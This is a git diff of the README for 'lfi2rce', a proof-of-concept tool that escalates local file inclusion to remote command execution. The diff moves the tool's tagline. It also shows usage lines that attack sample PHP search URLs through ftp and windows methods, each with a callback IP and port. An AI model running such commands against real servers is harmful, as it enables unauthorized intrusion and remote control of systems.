@@ -1,4 +1,5 @@
 # lfi2rce
+Local File Inclusion To Remote Command Execution (PoC)  
 
 ```
 lfi2rce - Local File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*
@@ -21,7 +22,5 @@ Examples:
           python3 lfi2rce "http://ghost.server/index.php?search=" ftp 10.0.2.15 1337
           python3 lfi2rce "http://ghost.winserver/index.php?s=" windows 10.0.2.15 1337
 ```
-
-Local File Inclusion To Remote Command Execution (PoC)  
 
 Note: smtp function can fail  
